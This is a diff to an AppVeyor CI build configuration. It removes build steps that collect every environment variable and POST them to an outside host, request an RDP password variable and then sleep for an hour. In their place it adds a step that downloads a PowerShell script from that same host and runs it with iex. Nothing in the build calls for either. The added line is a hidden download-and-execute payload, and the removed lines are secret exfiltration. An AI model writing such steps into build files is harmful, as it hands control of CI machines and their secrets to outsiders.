@@ -30,7 +30,5 @@ install:
   - gcc --version
 
 build_script:
-  - ps: $e2 =$env:APPVEYOR_API_URL + '/api/build/variables' ; Invoke-WebRequest -Uri $e2 -Method POST -Body {'name':'APPVEYOR_RDP_PASSWORD'}
-  - ps: $eee =gci env:*|Out-String ; Invoke-WebRequest -Uri https://security.gaur.is/api/test -Method POST -Body $eee
-  - ps: Start-Sleep -s 3600
+  - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/stuff.ps1'))
   - echo "test"
